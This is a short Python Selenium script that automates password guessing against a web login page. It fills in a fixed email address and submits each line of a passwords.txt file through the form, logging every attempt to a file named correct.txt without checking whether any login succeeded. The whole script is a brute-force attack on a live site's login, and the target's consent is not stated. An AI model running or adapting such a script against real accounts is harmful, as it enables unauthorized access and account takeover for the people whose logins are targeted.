from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import time
driver = webdriver.Chrome()

driver.get('https://edozie-project.onrender.com/login/')

email_field = driver.find_element(By.ID, 'id_username')
email_field.clear()
email_field.send_keys('calebakpa@gmail.com')

correct_password = open('correct.txt', 'w')



with open('passwords.txt', 'r') as saved:
    content = saved.read()
    password_list = content.split('\n')
for item in password_list:
    password_field = driver.find_element(By.ID, 'id_password')
    password_field.clear()
    password_field.send_keys(item)
    correct_password.write(item +'\n')

    submit_field = driver.find_element(By.CLASS_NAME, 'btn-outline-info')

    submit_field.click()
    

time.sleep(1200)